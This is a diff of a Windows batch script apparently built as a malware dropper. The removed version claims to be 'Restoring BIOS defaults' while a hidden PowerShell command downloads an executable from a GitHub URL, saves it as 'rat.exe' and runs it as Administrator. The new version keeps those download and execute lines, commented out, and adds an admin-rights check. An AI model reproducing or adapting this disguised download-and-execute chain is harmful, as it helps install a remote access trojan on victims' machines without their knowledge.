@@ -1,26 +1,15 @@
 @echo off
 
-goto get_permissions
+fltmc >nul 2>&1 && (
+  echo has admin permissions
+) || (
+  echo has NOT admin permissions
+)
 
-:get_permissions
-    echo Windows 11 :: Restoring BIOS defaults...
-    
-    net session >nul 2>&1
-    if %errorLevel% == 0 (
-        
-    ) else (
-        echo Please run the program with Administrative privleges.
-    )
-    
-    pause >nul
+::powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe" >nul 2>&1
 
-:: Hide PowerShell execution completely
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe" >nul 2>&1
+::echo hi
 
-:: Display "hi" message
-echo hi
-
-:: Run the downloaded file as administrator
-start /B "" runas /user:Administrator "%TEMP%\rat.exe"
+::start /B "" runas /user:Administrator "%TEMP%\rat.exe"
 
 endlocal
